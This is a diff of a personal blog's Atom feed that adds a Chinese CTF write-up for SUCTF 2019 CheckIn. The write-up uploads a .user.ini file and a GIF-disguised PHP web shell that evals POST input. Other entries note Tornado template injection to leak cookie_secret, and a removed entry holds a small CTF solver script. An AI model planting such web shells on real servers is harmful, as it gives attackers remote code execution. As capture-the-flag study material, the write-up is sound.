@@ -6,7 +6,7 @@
   <link href="http://haorical.xyz/atom.xml" rel="self"/>
   
   <link href="http://haorical.xyz/"/>
-  <updated>2021-10-15T15:31:55.094Z</updated>
+  <updated>2021-10-17T15:05:21.503Z</updated>
   <id>http://haorical.xyz/</id>
   
   <author>
@@ -17,11 +17,39 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>20211017</title>
+    <link href="http://haorical.xyz/posts/cd46c142/"/>
+    <id>http://haorical.xyz/posts/cd46c142/</id>
+    <published>2021-10-17T13:31:05.000Z</published>
+    <updated>2021-10-17T15:05:21.503Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>buu这个题应该是环境有问题，不能复现wp</p><p>先上传user.ini</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_propend_file=<span class="number">1.</span>gif</span><br></pre></td></tr></table></figure><p>然后上传图片马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>访问路径下的index.php，让它自动加载马</p><p>蚁剑或者直接cat flag</p><p>一会儿在本地测试一下</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>md5的一些基操</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SUCTF-2019-CheckIn&quot;&gt;&lt;a href=&quot;#SUCTF-2019-CheckIn&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]CheckIn&quot;&gt;&lt;/a&gt;[SUCTF 2019]CheckIn&lt;/h2&gt;&lt;p&gt;buu这</summary>
+      
+    
+    
+    
+    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
+    
+    
+    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
+    
+    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
+    
+    <category term="文件上传" scheme="http://haorical.xyz/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
+    
+  </entry>
+  
+  <entry>
     <title>20211015</title>
     <link href="http://haorical.xyz/posts/2348a06e/"/>
     <id>http://haorical.xyz/posts/2348a06e/</id>
     <published>2021-10-15T15:27:55.403Z</published>
-    <updated>2021-10-15T15:31:55.094Z</updated>
+    <updated>2021-10-15T15:32:07.486Z</updated>
     
     <content type="html"><![CDATA[<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><blockquote><p>模板注入</p></blockquote><p>先看提示，发现hints和/fllllllllllllag，根据url猜测是任意文件读取，研究后面参数，看hints，发现render，研究研究啥玩意</p><p>render是一个类似模板的东西，可以使用不同的参数来访问网页</p><p>在tornado模板中，存在一些可以访问的快速对象，例如 <code>&#123;&#123;handler.settings&#125;&#125;</code></p><p>这两个<code>&#123;&#123;&#125;&#125;</code>和这个字典对象也许大家就看出来了，没错就是这个handler.settings对象<br>handler 指向RequestHandler</p><p>而RequestHandler.settings又指向self.application.settings</p><p>所有handler.settings就指向RequestHandler.application.settings</p><p>可以获得一些设置</p><p>然后成功获得cookie_secret，md5获得hash值即可</p><p>在msg页面可以实现模板注入</p>]]></content>
     
@@ -412,9 +440,9 @@
     
     <category term="web" scheme="http://haorical.xyz/tags/web/"/>
     
-    <category term="命令执行" scheme="http://haorical.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
     <category term="rce" scheme="http://haorical.xyz/tags/rce/"/>
+    
+    <category term="命令执行" scheme="http://haorical.xyz/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -532,34 +560,6 @@
     <category term="web" scheme="http://haorical.xyz/tags/web/"/>
     
     <category term="反序列化" scheme="http://haorical.xyz/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>20210827</title>
-    <link href="http://haorical.xyz/posts/50c4a45c/"/>
-    <id>http://haorical.xyz/posts/50c4a45c/</id>
-    <published>2021-08-27T09:20:20.000Z</published>
-    <updated>2021-08-30T08:27:00.801Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="秋名山车神"><a href="#秋名山车神" class="headerlink" title="秋名山车神"></a>秋名山车神</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次写与ctf有关的python脚本(抄的)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://114.67.246.176:19128/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">ret=s.get(url)</span><br><span class="line"></span><br><span class="line">equation = re.search(<span class="string">r&#x27;(\d+[+\-*])+(\d+)&#x27;</span>,ret.text).group()</span><br><span class="line"></span><br><span class="line">ans=<span class="built_in">eval</span>(equation)</span><br><span class="line"></span><br><span class="line">d=&#123;<span class="string">&quot;value&quot;</span>:ans&#125;</span><br><span class="line"></span><br><span class="line">flag=s.post(url,data=d)</span><br><span class="line"></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;秋名山车神&quot;&gt;&lt;a href=&quot;#秋名山车神&quot; class=&quot;headerlink&quot; title=&quot;秋名山车神&quot;&gt;&lt;/a&gt;秋名山车神&lt;/h1&gt;&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;p</summary>
-      
-    
-    
-    
-    <category term="ctf每日一题" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
-    
-    
-    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
-    
-    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
-    
-    <category term="python" scheme="http://haorical.xyz/tags/python/"/>
     
   </entry>
   
